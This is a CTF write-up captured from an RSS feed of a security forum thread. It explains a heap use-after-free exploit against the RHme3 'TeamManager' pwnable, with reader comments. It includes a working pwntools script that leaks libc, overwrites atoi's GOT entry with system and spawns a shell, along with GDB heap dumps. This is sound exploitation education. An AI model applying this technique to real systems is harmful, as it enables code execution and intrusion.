	# The &#39;selected&#39; array contains the 3rd player object
	# We are abusing the UAF vuln to leak libc
	# show_player just checks if the &#39;selected&#39; array is empty
	# if it&#39;s not, it will print the value of the player&#39;s object
	# without checking if it&#39;s actually free&#39;d or not
	show()

	p.recvuntil(&#39;Name: &#39;)

	leak        = u64(p.recv(6).ljust(8, &#39;\x00&#39;))
	libc        = leak - 0x3c17b8
	system      = libc + 0x46590

	log.info(&quot;Leak:   0x{:x}&quot;.format(leak))
	log.info(&quot;Libc:   0x{:x}&quot;.format(libc))
	log.info(&quot;system: 0x{:x}&quot;.format(system))

	log.info(&quot;Overwriting atoi with system&quot;)

	# Consolidate with top chunk
	free(3) 

	# Overwrite 3rd player&#39;s (index 2) name pointer with atoi
	# in order to edit it with system&#39;s address
	alloc(&#39;Z&#39;*8 * 2 + p64(atoi_got))

	edit(p64(system))

	p.interactive()

if __name__ == &quot;__main__&quot;:
    log.info(&quot;For remote: %s HOST PORT&quot; % sys.argv[0])
    if len(sys.argv) &gt; 1:
        p = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        p = process(&#39;./main.elf&#39;)
        pause()
        pwn()
```

```makefile
 &gt;&gt; python rhme3.py
[*] For remote: rhme3.py HOST PORT
[+] Starting local process &#39;./main.elf&#39;: pid 29567
[*] Paused (press any to continue)
[*] Leak:   0x7ffff7dd37b8
[*] Libc:   0x7ffff7a12000
[*] system: 0x7ffff7a58590
[*] Overwriting atoi with system
[*] Switching to interactive mode
$ whoami
vagrant

```

---

### _Conclusion_

That&#39;s been it folks. Personally it was a very educational challenge and I learnt a ton about heap internals. If you feel puzzled after you&#39;re done reading it, it&#39;s ok, it&#39;s perfectly reasonable. Practice makes perfect. If you have any questions, please don&#39;t hesitate asking me either on IRC or in the comment section or via PM. 

The utilities I used to inspect the heap&#39;s memory layout were [pwngdb](https://github.com/scwuaptx/Pwngdb) and [gef](https://github.com/hugsy/gef). You can find the exploit and the binary on my [repo](https://github.com/sk4px/heapwn/tree/master/rhme3).

~ Peace!</description>
    
    <lastBuildDate>Tue, 19 Dec 2017 05:26:06 +0000</lastBuildDate>
    <category>Exploit Development</category>
    <atom:link href="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Heap Exploitation ~ Abusing Use-After-Free</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/13">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/13</link>
        <pubDate>Wed, 20 Dec 2017 06:05:40 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-3580-13</guid>
        <source url="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580.rss">Heap Exploitation ~ Abusing Use-After-Free</source>
      </item>
      <item>
        <title>Heap Exploitation ~ Abusing Use-After-Free</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>As long as you have access to the binary, you can do the aforementioned. If you’re talking about blind exploitation (blind ROP, blind format string attack), you just gotta leak multiple times.</p>
          <p><a href="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/12">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/12</link>
        <pubDate>Tue, 19 Dec 2017 05:18:35 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-3580-12</guid>
        <source url="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580.rss">Heap Exploitation ~ Abusing Use-After-Free</source>
      </item>
      <item>
        <title>Heap Exploitation ~ Abusing Use-After-Free</title>
        <dc:creator><![CDATA[cmderpt]]></dc:creator>
        <description><![CDATA[
            <p>Thanks for your explain but I still have an another issue. How to know <code>0x7ffff7a12000</code> (base address of libc) if I can’t do anything (e.g debug, <code>ld</code>,… ) except connecting to socket</p>
          <p><a href="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/11">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/11</link>
        <pubDate>Tue, 19 Dec 2017 02:12:22 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-3580-11</guid>
        <source url="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580.rss">Heap Exploitation ~ Abusing Use-After-Free</source>
      </item>
      <item>
        <title>Heap Exploitation ~ Abusing Use-After-Free</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>Hi <a class="mention" href="https://d.clarkee.co.uk/u/cmderpt">@cmderpt</a>,</p>
<p>Assuming you’ve understood the theory behind malloc (main arena, bins etc), it’s not hard to understand why I did it. It’s known that there is a UAF vulnerability and I abuse that to leak libc’s base address. When a chunk (either small or large chunk) is free’d, it’s placed in a doubly linked list. That linked list has as <strong>HEAD</strong> the libc itself. All the linked lists which malloc uses in order to keep track of the free’d chunks start within libc.</p>
<p>That being said, <code>0x604140</code> is a small chunk and once free’d it will be placed in the <strong>unsorted bin</strong>, which is simply an array of pointers which extends to linked lists.</p>
<p>Here’s a simple illustration:</p>
<pre><code class="lang-makefile">Unsorted bin before:
              Head
main_arena: + - - - +  fd
            |       | -----&gt; NULL
            |       |
NULL &lt;----  + - - - +
       bk
</code></pre>
<pre><code class="lang-makefile">Unsorted bin after:
              Head           0x604140
main_arena: + - - - +  fd    + - - - +  fd
            |       | ----&gt;  |       | ----&gt; HEAD
            |       |   bk   |       |
      +---- + - - - + &lt;----  + - - - +
      |                          ^
      |                          |
      +---------------------------
                    bk             
</code></pre>
<pre><code class="lang-makefile">0x604140:	0x0000000000603110	0x0000000000000091
0x604150:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
</code></pre>
<p>So as you can see the recently free’d chunk points back to the <strong>HEAD</strong> (0x00007ffff7dd37b8) of the doubly linked list (which is nothing else but libc) since it’s the <strong>only</strong> one there currently.</p>
<p>Now by taking advantage of the UAF we can still dump the contents of <code>0x604140</code>. Even though ASLR is on, the libc pointer which has now populated the free’d chunk has a <strong>constant offset distance</strong> from libc’s base. All I did was find libc’s base address in GDB and then subtracted it from that unsorted bin address.</p>
<pre><code class="lang-makefile">Python 2.7.12 (default, Nov 20 2017, 18:23:56) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; hex(0x00007ffff7dd37b8 - 0x7ffff7a12000)
'0x3c17b8'
</code></pre>
<p>And that’s how I got libc’s base address dynamically. Keep in mind the offset might differ on your system. I hope I made it clearer.</p>
          <p><a href="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/10">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/10</link>
        <pubDate>Sat, 16 Dec 2017 09:46:42 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-3580-10</guid>
        <source url="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580.rss">Heap Exploitation ~ Abusing Use-After-Free</source>
      </item>
      <item>
        <title>Heap Exploitation ~ Abusing Use-After-Free</title>
        <dc:creator><![CDATA[cmderpt]]></dc:creator>
        <description><![CDATA[
            <p>Hi <a class="mention" href="https://d.clarkee.co.uk/u/_py">@_py</a>,<br>
I’m a newbie so can you explain why do you have a expression</p>
<pre><code class="lang-auto">libc        = leak - 0x3c17b8</code></pre>
<p>I don’t understand where is <code>0x3c17b8</code> come from?<br>
Thank you ^^</p>
          <p><a href="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/9">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/9</link>
        <pubDate>Sat, 16 Dec 2017 02:55:19 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-3580-9</guid>
        <source url="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580.rss">Heap Exploitation ~ Abusing Use-After-Free</source>
      </item>
      <item>
        <title>Heap Exploitation ~ Abusing Use-After-Free</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>Glad I could help!</p>
<p>Make sure to google/youtube for more write-ups on this challenge because heap exploitation is kinda “hybrid”. As in, the approaches can differ and maybe a different technique could be more intuitive to you compared to the one I presented.</p>
          <p><a href="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/8">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/8</link>
        <pubDate>Wed, 13 Sep 2017 20:04:23 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-3580-8</guid>
        <source url="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580.rss">Heap Exploitation ~ Abusing Use-After-Free</source>
      </item>
      <item>
        <title>Heap Exploitation ~ Abusing Use-After-Free</title>
        <dc:creator><![CDATA[neolex]]></dc:creator>
        <description><![CDATA[
            <p>Thank you for this great write up !<br>
I was trying this challenge and couldn’t solve it by myself <img src="https://0x00sec.org/images/emoji/twitter/confused.png?v=9" title=":confused:" class="emoji" alt=":confused:"><br>
So thanks !</p>
          <p><a href="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/7">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/7</link>
        <pubDate>Wed, 13 Sep 2017 20:01:33 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-3580-7</guid>
        <source url="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580.rss">Heap Exploitation ~ Abusing Use-After-Free</source>
      </item>
      <item>
        <title>Heap Exploitation ~ Abusing Use-After-Free</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>There was the following menu as I described:</p>
<pre data-code-wrap="makefile"><code class="lang-makefile">Welcome to your TeamManager (TM)!
0.- Exit
1.- Add player
2.- Remove player
3.- Select player
4.- Edit player
5.- Show player
6.- Show team
Your choice:
</code></pre>
<p>When you enter the choice number, atoi is used behind the scenes to convert your input into an actual integer (read is being called to read in the input).</p>
<p>That being said, once edit() is done, we’ll be prompted back with the menu and we get to choose again what we want to do. Since I overwrote atoi with system, once I enter <em>sh</em> as a choice, read passes the pointer that was read as choice to system and we get the shell.</p>
<p>There was also strlen being called, we could overwrite that one with system since strlen also receives a pointer (again, our input) as its argument.</p>
<aside class="quote no-group" data-username="0x00pf" data-post="5" data-topic="3580">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="24" height="24" src="https://d.clarkee.co.uk/user_avatar/d.clarkee.co.uk/0x00pf/48/13708_2.png" class="avatar"> 0x00pf:</div>
<blockquote>
<p>I had to download the code and take a look to understand why you have selected that function <img src="https://d.clarkee.co.uk/images/emoji/twitter/slight_smile.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"> .</p>
</blockquote>
</aside>
<p>That was the goal, to let the reader investigate deeper by him/herself <img src="https://d.clarkee.co.uk/images/emoji/twitter/wink.png?v=15" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"></p>
<aside class="quote no-group" data-username="0x00pf" data-post="5" data-topic="3580">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="24" height="24" src="https://d.clarkee.co.uk/user_avatar/d.clarkee.co.uk/0x00pf/48/13708_2.png" class="avatar"> 0x00pf:</div>
<blockquote>
<p>I’d suggest to add a line indicating the gdb scripts you are using, so people could try by themselves. I bet it is Pwngdb…</p>
</blockquote>
</aside>
<p>You’re right, will fix it asap!</p>
          <p><a href="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/6">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/6</link>
        <pubDate>Wed, 13 Sep 2017 19:29:06 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-3580-6</guid>
        <source url="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580.rss">Heap Exploitation ~ Abusing Use-After-Free</source>
      </item>
      <item>
        <title>Heap Exploitation ~ Abusing Use-After-Free</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>This write-up is brilliant!!!. Congrats mate!</p>
<p>My only comment is that I got a bit confused towards the end when you say that you can run <code>system</code> overwriting <code>atoi</code>'s GOT entry. I had to download the code and take a look to understand why you have selected that function <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> . While reading the text it sounded as a completely arbitrary choice to me…</p>
<p>I’d suggest to add a line indicating the <code>gdb</code> scripts you are using, so people could try by themselves. I bet it is <code>Pwngdb</code>…</p>
          <p><a href="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/5">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/5</link>
        <pubDate>Wed, 13 Sep 2017 19:21:36 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-3580-5</guid>
        <source url="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580.rss">Heap Exploitation ~ Abusing Use-After-Free</source>
      </item>
      <item>
        <title>Heap Exploitation ~ Abusing Use-After-Free</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            <p>I only half understand this, but I wish I could like it twice.</p>
          <p><a href="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/4">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/4</link>
        <pubDate>Wed, 13 Sep 2017 18:59:20 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-3580-4</guid>
        <source url="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580.rss">Heap Exploitation ~ Abusing Use-After-Free</source>
      </item>
      <item>
        <title>Heap Exploitation ~ Abusing Use-After-Free</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>Woops, I messed up the markdown format that’s why <img src="https://d.clarkee.co.uk/images/emoji/twitter/confused.png?v=15" title=":confused:" class="emoji" alt=":confused:" loading="lazy" width="20" height="20"> It’s now fixed! All of you please do check out the resources I mentioned. I don’t want to take their glory. The folks did an amazing job!</p>
<aside class="quote no-group" data-username="Sirius" data-post="2" data-topic="3580">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="24" height="24" src="https://d.clarkee.co.uk/user_avatar/d.clarkee.co.uk/sirius/48/4206_2.png" class="avatar"> Sirius:</div>
<blockquote>
<p>But otherwise this was fucking awesome!!!</p>
</blockquote>
</aside>
<p>Much appreciated man!</p>
          <p><a href="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/3">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/3</link>
        <pubDate>Wed, 13 Sep 2017 17:51:15 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-3580-3</guid>
        <source url="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580.rss">Heap Exploitation ~ Abusing Use-After-Free</source>
      </item>
      <item>
        <title>Heap Exploitation ~ Abusing Use-After-Free</title>
        <dc:creator><![CDATA[Sirius]]></dc:creator>
        <description><![CDATA[
            <p>The link in the following paragraph is broken:</p>
<blockquote>
<p>In other words, libc keeps track of the allocated chunks by storing their pointers in an array according to their sizes. In reality, each entry is a single / double-linked list which holds a pointer to a different size of chunk. Meaning, the first entry of the fastbin list will point to a free’d chunk of size 16. The second entry of the fastbin list will point to a free’d chunk of size 24 and so on. Same goes for the unsorted / small / large bin. I higly recommend to check out (<strong>Broken Link Here</strong>) link to get a visual of those lists. I can’t describe it any better than this guy, it’s just awesome.</p>
</blockquote>
<p>But otherwise this was fucking awesome!!!</p>
          <p><a href="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/2">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/2</link>
        <pubDate>Wed, 13 Sep 2017 17:46:58 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-3580-2</guid>
        <source url="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580.rss">Heap Exploitation ~ Abusing Use-After-Free</source>
      </item>
      <item>
        <title>Heap Exploitation ~ Abusing Use-After-Free</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>Sup folks! I hope you are all doing great. It’s been a long time since my last CTF write-up. The main reason is because I was trying to master the beast called heap exploitation and I’ve yet to learn a ton about it. To showcase one of the modern ways to pwn a heap-based vulnerable binary, I’ll use a binary that was provided during the RHme3 CTF.</p>
<p>This post might be a shocking example to some of you as to how C/C++ programmers can easily get their binaries pwned in no time if they don’t know what they are doing at the lowest level.</p>
<p>Anyway, RHme3 CTF quals was going on a couple of weeks ago and unfortunately I wasn’t available to play on time so I downloaded the pwnable to mess with it offline. This certain pwnable has to do with heap exploitation, though not really advanced stuff. Knowing that in order to master heap, a write-up is never enough, I’ll link down below some resources I used to make myself familiar with malloc’s / free’s algo.</p>
<p>In order to make this write-up short and not an entire book, If this is your first time touching on heap internals, you might want to have a look at the references I’ve provided below (I’ll be using them to explain a couple of terms) because I will not go into the theory behind the internals, that’s your job to do. Just keep in mind that heap is no joke (unless you are mentally gifted) and you shouldn’t expect to understand / manipulate it not even within the first 10-20 tries.</p>
<ul>
<li><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/" rel="nofollow noopener">Glibc Malloc Internals</a></li>
<li><a href="https://heap-exploitation.dhavalkapil.com" rel="nofollow noopener">Heap Exploitation</a></li>
</ul>
<p>Let the fun begin!</p>
<hr>
<h3><em>Binary Review</em></h3>
<p>Let’s start with the all-time classic recon phase, let’s run the binary!</p>
<pre><code class="lang-makefile">Welcome to your TeamManager (TM)!
0.- Exit
1.- Add player
2.- Remove player
3.- Select player
4.- Edit player
5.- Show player
6.- Show team
Your choice:
</code></pre>
<p>We’re presented with the above menu. In general, most of the heap pwnables regarding CTFs are menu-driven binaries, so after plenty of practice, reverse engineering becomes less and less tedious.</p>
<p>After messing around with the binary’s funcionality, the conclusions are the following:</p>
<ul>
<li>We get to create players in order to form a team. Those players are nothing more than C structs ofcourse. Each player has the following struct attributes.</li>
</ul>
<pre><code class="lang-auto">struct player {
     int32_t attack_pts;
     int32_t defense_pts;
     int32_t speed;
     int32_t precision;
     char *name;
}    
</code></pre>
<ul>
<li>
<p>We get to show / dump / edit the team’s or the player’s info.</p>
</li>
<li>
<p>We get to delete a player from the team.</p>
</li>
<li>
<p>Note that in order to do the two aforementioned actions, we need to first <strong>select</strong> the player by entering an idex. Really important info to remember for later.</p>
</li>
</ul>
<p>Alright, enough with the high-level stuff, let’s get dirty with assembly.</p>
<hr>
<h3><em>Reverse Engineering</em></h3>
<p>I’ll be focusing on the core functions of the binary.</p>
<h4>.: Player Allocation :.</h4>
<p>The go-to function for heap pwnables is the one which allocates memory for an object (a player in our case). That’s the one with the juiciest info. Let’s investigate what it does.</p>
<hr>
<p><em><strong>Tip <span class="hashtag">#1</span></strong>: Note that we don’t need to reverse engineer the entire binary. The most important part in Reverse Engineering is knowing <strong>what</strong> to reverse. Meaning, most of the analysis will happen dynamically, but it’s wise to get a quick idea of the binary’s internals via static analysis.</em></p>
<hr>
<p><em><strong>Tip <span class="hashtag">#2</span></strong>: Most  heap-based binaries need to keep track of the dynamically allocated objects. There’s usually a global array of struct pointers in order to do that. Makes sense, right? That being said, let’s quickly prove this assumption.</em></p>
<hr>
<p>We have the following two lines of assembly in the beginning of the <em>addPlayer</em> function.</p>
<pre><code class="lang-auto">00401848  mov     rax, qword [rax*8+0x603180]
00401850  test    rax, rax
</code></pre>
<p>Just those two lines are enough for an exploit-dev person to figure out what this whole function does,  and trust me, the function is big. I know some of you might wanted me to showcase the entire disassembly, but when you have to pwn binaries for 48-hours straight, you have to be crazy fast and effective. So let’s make some more assumptions.</p>
<ul>
<li>
<p>There’s this interesting address <em>0x603180</em>, from which we read its content depending on the value of <em>rax</em>. This is classic array indexing.</p>
</li>
<li>
<p>There’s a check against the content of that array value. A check to see if it’s NULL ofcourse. Why though? As I said in tip <span class="hashtag">#2</span>, the program needs to keep track of those allocated player objects.</p>
</li>
<li>
<p>Since it’s an allocation function, it’s pretty likely that it allocates a new player object and stores its pointer into that index depending on the result of the check.</p>
</li>
</ul>
<p>At the end of the function there’s also this line right before it exits:</p>
<pre><code class="lang-auto">00401af8  mov     qword [rax*8+0x603180], rdx
</code></pre>
<p>It uses again the same indexing method, but this time to <strong>store</strong> in that entry the value <em>rdx</em> holds. I believe it’s safe to assume that the player allocation happens in the following manner:</p>
<ol>
<li>
<p>Check if there’s an available entry in the global array for allocation.</p>
</li>
<li>
<p>If the answer to the previous check is yes, ask the user for the player’s info.</p>
</li>
<li>
<p>Once the user is done, store the new allocated player’s address inside the global array.</p>
</li>
</ol>
<h4>.: Player Selection :.</h4>
<p>Coolio, the analysis goes well so far. Before we fire up GDB, let’s check out the function that selects a player. My senses are telling me that there might be a bug there <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
<pre><code class="lang-auto">00401c8b  mov     eax, dword [rbp-0x14]
00401c8e  mov     rax, qword [rax*8+0x603180]
00401c96  mov     qword [rel selected], rax
</code></pre>
<p>Once again, from an exploit-dev standpoint, just those 3 lines are more than enough to understand the functionality of the function.</p>
<ul>
<li>
<p><em>eax</em> gets the value stored in the local variable at offset <em>rbp - 0x14</em>. That’s 100% the index we entered in the prompt.</p>
</li>
<li>
<p><em>eax</em> is indeed used as an index into that global array.</p>
</li>
<li>
<p><em>rax</em> now holds the content (the address of a player’s object in that case) of that array entry and it stores is inside another global variable’s address called <em>selected</em>.</p>
</li>
</ul>
<p>Although the binary is not stripped, the aforementioned conclutions would be as easy to make as if it was stripped.</p>
<hr>
<h3><em>Dynamic Analysis</em></h3>
<p>Enough with the assembly, let’s get the ball rolling! First things first, let’s check out the player allocation in action by stepping through my exploit in GDB.</p>
<hr>
<h2><em><strong>Note:</strong> As I said before, this is not a beginner friendly write-up. If you’re new to heap internals, I strongly advice you to go through the reference links. Although I’ll give a quick overview of some of the internals, to really understand the whys and hows of my exploit, it’s better to have a clear and deep understanding of how the heap <strong>actually</strong> works.</em></h2>
<pre><code class="lang-python">def alloc(name, attack = 1, 
		  defense = 2, speed = 3, precision = 4):

	p.recvuntil('choice: ')
	p.sendline('1')

	p.recvuntil('name: ')
	p.sendline(name)

	p.recvuntil('points: ')
	p.sendline(str(attack))

	p.recvuntil('points: ')
	p.sendline(str(defense))

	p.recvuntil('speed: ')
	p.sendline(str(speed))

	p.recvuntil('precision: ')
	p.sendline(str(precision))

	return

def pwn():

    alloc('A'*0x60)

</code></pre>
<pre><code class="lang-makefile">                              (gdb) x/80gx 0x604000
       actual player chunk --&gt; 0x604000:	0x0000000000000000	0x0000000000000021
Pointer returned by malloc --&gt; 0x604010:	0x0000000200000001	0x0000000400000003
       player's name chunk --&gt; 0x604020:	0x0000000000604030	0x0000000000000071
                               0x604030:	0x4141414141414141	0x4141414141414141
                               0x604040:	0x4141414141414141	0x4141414141414141
                               0x604050:	0x4141414141414141	0x4141414141414141
                               0x604060:	0x4141414141414141	0x4141414141414141
                               0x604070:	0x4141414141414141	0x4141414141414141
                               0x604080:	0x4141414141414141	0x4141414141414141
                 top chunk --&gt; 0x604090:	0x0000000000000000	0x0000000000020f71
</code></pre>
<p>Cute, so what do we have here? We allocated a new player. As you can see from the image above, the player object is by default allocated with a size of <em>0x20</em> (the last bit is set in order signify that the previous chunk is in use. Again, check the reference links.) and for its name (of size <em>0x60</em>), there’s a malloc pointer pointing to a new allocated chunk which is used just to store its name.</p>
<p>Let’s move on with the next allocation. I’ll start using a more generic naming convention for the player chunks.</p>
<pre><code class="lang-python">alloc('B'*0x60)
</code></pre>
<pre><code class="lang-auto">(gdb) x/80gx 0x604000
0x604000:	0x0000000000000000	0x0000000000000021  &lt;-- player 0
0x604010:	0x0000000200000001	0x0000000400000003
0x604020:	0x0000000000604030	0x0000000000000071
0x604030:	0x4141414141414141	0x4141414141414141
0x604040:	0x4141414141414141	0x4141414141414141
0x604050:	0x4141414141414141	0x4141414141414141
0x604060:	0x4141414141414141	0x4141414141414141
0x604070:	0x4141414141414141	0x4141414141414141
0x604080:	0x4141414141414141	0x4141414141414141
0x604090:	0x0000000000000000	0x0000000000000021 &lt;-- player 1
0x6040a0:	0x0000000200000001	0x0000000400000003
0x6040b0:	0x00000000006040c0	0x0000000000000071
0x6040c0:	0x4242424242424242	0x4242424242424242
0x6040d0:	0x4242424242424242	0x4242424242424242
0x6040e0:	0x4242424242424242	0x4242424242424242
0x6040f0:	0x4242424242424242	0x4242424242424242
0x604100:	0x4242424242424242	0x4242424242424242
0x604110:	0x4242424242424242	0x4242424242424242
0x604120:	0x0000000000000000	0x0000000000020ee1 &lt;-- top chunk
</code></pre>
<hr>
<h2><em>Because the array indexing happens as always from 0, I used <strong>player 0</strong> for the 1st player object and so on. Just an FYI in case you got confused.</em></h2>
<p>Let’s finish with the allocations for now.</p>
<pre><code class="lang-python">alloc('C'*0x80)
alloc('D'*0x80)
</code></pre>
<pre><code class="lang-makefile">(gdb) x/90gx 0x604000
0x604000:	0x0000000000000000	0x0000000000000021 &lt;-- player 0
0x604010:	0x0000000200000001	0x0000000400000003
0x604020:	0x0000000000604030	0x0000000000000071
0x604030:	0x4141414141414141	0x4141414141414141
0x604040:	0x4141414141414141	0x4141414141414141
0x604050:	0x4141414141414141	0x4141414141414141
0x604060:	0x4141414141414141	0x4141414141414141
0x604070:	0x4141414141414141	0x4141414141414141
0x604080:	0x4141414141414141	0x4141414141414141
0x604090:	0x0000000000000000	0x0000000000000021 &lt;-- player 1
0x6040a0:	0x0000000200000001	0x0000000400000003
0x6040b0:	0x00000000006040c0	0x0000000000000071
0x6040c0:	0x4242424242424242	0x4242424242424242
0x6040d0:	0x4242424242424242	0x4242424242424242
0x6040e0:	0x4242424242424242	0x4242424242424242
0x6040f0:	0x4242424242424242	0x4242424242424242
0x604100:	0x4242424242424242	0x4242424242424242
0x604110:	0x4242424242424242	0x4242424242424242
0x604120:	0x0000000000000000	0x0000000000000021 &lt;-- player 2
0x604130:	0x0000000200000001	0x0000000400000003
0x604140:	0x0000000000604150	0x0000000000000091
0x604150:	0x4343434343434343	0x4343434343434343
0x604160:	0x4343434343434343	0x4343434343434343
0x604170:	0x4343434343434343	0x4343434343434343
0x604180:	0x4343434343434343	0x4343434343434343
0x604190:	0x4343434343434343	0x4343434343434343
0x6041a0:	0x4343434343434343	0x4343434343434343
0x6041b0:	0x4343434343434343	0x4343434343434343
0x6041c0:	0x4343434343434343	0x4343434343434343
0x6041d0:	0x0000000000000000	0x0000000000000021 &lt;-- player 3
0x6041e0:	0x0000000200000001	0x0000000400000003
0x6041f0:	0x0000000000604200	0x0000000000000091
0x604200:	0x4444444444444444	0x4444444444444444
0x604210:	0x4444444444444444	0x4444444444444444
0x604220:	0x4444444444444444	0x4444444444444444
0x604230:	0x4444444444444444	0x4444444444444444
0x604240:	0x4444444444444444	0x4444444444444444
0x604250:	0x4444444444444444	0x4444444444444444
0x604260:	0x4444444444444444	0x4444444444444444
0x604270:	0x4444444444444444	0x4444444444444444
0x604280:	0x0000000000000000	0x0000000000020d81 &lt;-- top chunk
</code></pre>
<p>Here’s a memory view of the global array which holds the player struct pointers:</p>
<pre><code class="lang-makefile">(gdb) x/4gx 0x603180
0x603180 &lt;players&gt;:	    0x0000000000604010	0x00000000006040a0
0x603190 &lt;players+16&gt;:	0x0000000000604130	0x00000000006041e0
</code></pre>
<p>Sweet, we have officially created our team. Now what? After all, we’re here to pwn! Well, I purposely left out a crucial part of our static recon for this phase of our analysis.</p>
<hr>
<h3><em>UAF Vulnerability</em></h3>
<p>Heap is all about _malloc_ating memory and <em>free</em>-ing memory. However, if <em>free</em>-ing isn’t managed correctly, there can be major leaks, all the way up to arbitrary code execution! What do I mean by that? Let’s check out how deleting a player actually happens.</p>
<pre><code class="lang-auto">             [...]
/* index */
00401b9c  mov     eax, dword [rbp-0x1c]
/* player struct pointer */
00401b9f  mov     rax, qword [rax*8+0x603180] 
00401ba7  mov     qword [rbp-0x18], rax
00401bab  mov     eax, dword [rbp-0x1c]
/* Mitigate double-free, good shit */
00401bae  mov     qword [rax*8+0x603180], 0x0 
00401bba  mov     rax, qword [rbp-0x18]
/* player's name pointer */
00401bbe  mov     rax, qword [rax+0x10]      
00401bc2  mov     rdi, rax
00401bc5  call    free
/* player's chunk */
00401bca  mov     rax, qword [rbp-0x18]   
00401bce  mov     rdi, rax
00401bd1  call    free
             [...]
</code></pre>
<p>The player’s name is free’d first and then the player’s chunk itself. But oh my, do you see what I see?! As I mentioned above, when we want to <em>show</em> a player we have to <em>select</em> it beforehand. But, the above assembly snippet doesn’t zero out the global <em>selected</em> variable! This is a major logic bug because that practically means we can <strong>still print</strong> a player’s content even if it’s free!</p>
<p>This is how the <em>show</em> function works:</p>
<pre><code class="lang-auto">/* Global variable holding a player pointer */
             [...]
